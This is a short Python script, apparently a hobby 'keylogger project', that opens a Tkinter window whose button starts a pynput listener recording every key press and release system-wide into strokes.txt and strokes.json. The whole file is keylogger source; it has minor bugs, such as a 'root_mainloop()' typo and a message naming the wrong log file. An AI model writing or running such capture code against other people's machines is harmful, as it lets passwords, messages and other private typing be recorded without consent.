import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("250x300")
root.title("keylogger project")
root.configure(bg ="lightgreen")

key_list = []
flag = False
key_strokes = ""

def update_txt(key):
    with open('strokes.txt', 'w+') as key_stroke:
        key_stroke.write(key)


def update_json_file(key_list):
    with open('strokes.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global flag, key_list
    if flag == False:
        key_list.append({'Pressed' : f'{key}'})
        flag = True

    if flag == True:
        key_list.append({'Held' : f'{key}'})

    update_json_file(key_list)

def on_release(key):
    global flag, key_list, key_strokes
    key_list.append({'Released' : f'{key}'})
    
    if flag == True:
        flag = False

    update_json_file(key_list)
    key_strokes = key_strokes + str(key)
    update_txt(str(key_strokes))

def butaction():
    
    print("[+] Keylogger Running successfully!\n[!] saving the key in 'logs.json'")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()

empty = Label(root, text=" ").grid(row=0,column=0)
empty = Label(root, text=" ").grid(row=1,column=0)
empty = Label(root, text=" ").grid(row=2,column=0)
empty = Label(root, text="Key logger Project", font='Verdana 11 bold').grid(row=3,column=3)
empty = Label(root, text=" ").grid(row=4,column=0)
empty = Label(root, text=" ").grid(row=5,column=0)
Button(root, text="Start Keylogger",command=butaction).grid(row=6,column=3)
root_mainloop() 
